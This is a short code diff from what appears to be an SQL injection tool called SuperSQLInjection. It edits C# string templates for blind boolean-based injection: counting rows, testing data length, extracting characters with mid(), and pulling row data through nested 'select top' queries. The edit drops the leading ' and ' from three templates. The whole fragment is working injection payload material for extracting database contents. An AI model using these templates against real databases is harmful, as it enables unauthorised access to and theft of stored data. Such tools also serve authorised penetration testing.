@@ -10,14 +10,14 @@ namespace SuperSQLInjection.payload
         public static String data_count = "(select count(*) from {table})";
  
         //判断条数
-        public static String bool_datas_count = " and " + data_count + ">={len}";
+        public static String bool_datas_count = " " + data_count + ">={len}";
 
         public static String substr = "mid(({data}),{index},1)";
 
         //bool方式字符长度判断
-        public static String bool_length = " and len({data})>{len}";
+        public static String bool_length = " len({data})>{len}";
 
-        public static String bool_value = " and {data}>{len}";
+        public static String bool_value = " {data}>{len}";
 
         //获取行数据
         public static String data_value = "(select top 1 {data} from (select top {index} {allcolumns} from {table} order by {orderby} asc) t order by t.{orderby} desc)";
